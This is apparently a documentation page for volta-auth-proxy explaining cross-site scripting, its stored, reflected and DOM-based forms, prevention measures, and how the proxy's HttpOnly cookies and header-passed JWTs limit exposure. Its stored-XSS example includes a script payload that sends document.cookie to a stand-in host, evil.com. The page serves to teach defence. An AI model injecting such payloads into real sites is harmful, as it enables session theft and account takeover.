# XSS (Cross-Site Scripting)

## What is it?

Cross-Site Scripting (XSS) is a type of security attack where an attacker injects malicious JavaScript code into a web page that other users visit. When those users load the page, their browser runs the attacker's code as if it were a legitimate part of the site.

The name "Cross-Site Scripting" comes from the fact that code from one origin (the attacker's) ends up running in the context of another origin (the victim's trusted website). It was abbreviated as "XSS" instead of "CSS" to avoid confusion with Cascading Style Sheets.

There are three main types:

### Stored XSS (Persistent)

The malicious script is saved on the server -- for example, in a database field, a forum post, or a user profile. Every user who views that content runs the attacker's code.

```
  Attacker writes a comment:
  "Great article! <script>fetch('https://evil.com/steal?cookie='+document.cookie)</script>"

  Server saves it to the database.

  Victim loads the comment page.
  Browser sees the <script> tag and runs it.
  The victim's cookies are sent to evil.com.
```

### Reflected XSS

The malicious script is part of a URL or form input that the server immediately echoes back in the response without sanitizing it.

```
  Attacker sends a link:
  https://trusted-site.com/search?q=<script>alert('hacked')</script>

  Victim clicks the link.
  Server responds: "Results for: <script>alert('hacked')</script>"
  Browser runs the script.
```

### DOM-based XSS

The attack happens entirely in the browser. Client-side JavaScript reads data from the URL or other user-controlled source and inserts it into the page without proper escaping.

## Why does it matter?

XSS is one of the most common web vulnerabilities, and the consequences can be severe:

- **Cookie theft.** If session cookies are accessible to JavaScript, an attacker's script can read `document.cookie` and send it to their server. They can then impersonate the victim.
- **Token theft.** If access tokens or JWTs are stored in `localStorage` or `sessionStorage`, XSS can read them directly.
- **Account takeover.** The attacker's script can make API calls on behalf of the victim -- changing their password, transferring money, or granting the attacker admin access.
- **Keylogging.** The script can capture everything the user types on the page.
- **Phishing.** The script can modify the page to show a fake login form that sends credentials to the attacker.

The core problem is that the browser cannot tell the difference between the site's legitimate JavaScript and the attacker's injected JavaScript. Once it's in the page, it has full access to everything.

## How does it work?

Here is the anatomy of a typical stored XSS attack targeting session cookies:

```
  +----------+     1. Post malicious comment    +--------+
  | Attacker |--------------------------------->| Server |
  +----------+                                  +--------+
                                                    |
                                                    | 2. Saves comment
                                                    |    (with <script>)
                                                    v
                                                +--------+
                                                |   DB   |
                                                +--------+
                                                    |
  +----------+     3. Loads page with comment   +--------+
  |  Victim  |<---------------------------------| Server |
  +----------+                                  +--------+
       |
       | 4. Browser runs <script>
       | 5. document.cookie sent to evil.com
       v
  +----------+
  | evil.com |  <-- Attacker now has the session cookie
  +----------+
```

### Prevention techniques

**1. Output encoding (escaping).**
Whenever user input is rendered in HTML, encode special characters so the browser treats them as text, not code. `<` becomes `&lt;`, `>` becomes `&gt;`, etc.

**2. HttpOnly cookies.**
Setting the `HttpOnly` flag on cookies makes them invisible to JavaScript. Even if XSS succeeds, the attacker cannot read the cookie via `document.cookie`. The browser still sends HttpOnly cookies with requests, but scripts cannot access them.

```
Set-Cookie: __volta_session=abc123; HttpOnly; Secure; SameSite=Lax
```

**3. Content Security Policy (CSP).**
A CSP header tells the browser which sources of scripts are allowed. A strict CSP can prevent inline scripts from running at all, which stops most XSS attacks.

```
Content-Security-Policy: default-src 'self'; script-src 'self'
```

**4. Don't store sensitive tokens in localStorage.**
`localStorage` has no protection against XSS. Any script running on the page can read it. Session cookies with `HttpOnly` are safer.

**5. Input validation.**
Validate and sanitize user input on the server side. Reject or strip out HTML tags where they are not expected.

## How does volta-auth-proxy use it?

volta-auth-proxy is designed with XSS defense as a core principle:

**HttpOnly session cookies.** volta's session cookie (`__volta_session`) is always set with `HttpOnly`. This means that even if an XSS vulnerability exists somewhere in a downstream application, the attacker's JavaScript cannot read the session cookie.

```
__volta_session=<session-id>; Path=/; Max-Age=28800; HttpOnly; SameSite=Lax
```

**Server-side session storage.** The session ID in the cookie is an opaque UUID. The actual session data (user ID, tenant ID, expiration) lives in volta's PostgreSQL database, not in the browser. There is nothing useful for an attacker to decode from the cookie value itself.

**JWT as a short-lived, server-issued token.** volta issues JWTs with a 5-minute lifetime (configurable via `JWT_TTL_SECONDS`, default 300). These JWTs are passed to downstream applications via the `X-Volta-JWT` header in the ForwardAuth flow, not stored in the browser's localStorage. This means:

- No JWT sits in localStorage waiting to be stolen by XSS.
- Even if a JWT is intercepted, it expires in minutes.

**Template engine with auto-escaping.** volta uses JTE (Java Template Engine) for rendering HTML pages. JTE escapes output by default, which prevents stored and reflected XSS in volta's own pages (like the login page or tenant selector).

The architecture looks like this:

```
  Browser                   volta-auth-proxy           Downstream App
  +--------+               +----------------+         +-------------+
  |        |--cookie------>|                |         |             |
  |        |  (HttpOnly,   | Session lookup |         |             |
  |        |   no JS       | in PostgreSQL  |         |             |
  |        |   access)     |                |         |             |
  |        |               | Issues JWT     |-------->|             |
  |        |               | (X-Volta-JWT   |  Header |             |
  |        |               |  header, not   |  only,  |             |
  |        |               |  localStorage) |  no JS  |             |
  +--------+               +----------------+         +-------------+

  XSS in the downstream app cannot steal:
  - The session cookie (HttpOnly)
  - The JWT (never in localStorage)
```

## Common mistakes

**1. Storing JWTs in localStorage.**
This is the most common mistake in modern web apps. If you put your JWT in `localStorage`, any XSS vulnerability on the page gives the attacker your token. Use HttpOnly cookies for session management instead.

**2. Setting HttpOnly on some cookies but not the session cookie.**
The most important cookie to protect is the one that grants access. Make sure your primary session cookie has `HttpOnly` set.

**3. Relying only on CSP without output encoding.**
CSP is a great defense-in-depth measure, but it should not be your only protection. Encode output as well, because CSP can be misconfigured or bypassed in some edge cases.

**4. Trusting that frontend frameworks prevent all XSS.**
React, Vue, and Angular escape output by default, but they all have escape hatches (`dangerouslySetInnerHTML` in React, `v-html` in Vue). If user-supplied data goes through these, XSS is back.

**5. Forgetting about third-party scripts.**
Every `<script>` tag you include from a CDN or analytics provider has full access to your page. If one of those is compromised, it is effectively an XSS attack. Minimize third-party scripts and use Subresource Integrity (SRI) where possible.

**6. Assuming HTTPS prevents XSS.**
HTTPS protects data in transit. It does nothing to prevent scripts that are already injected into the page. XSS is a content-injection problem, not a transport problem.
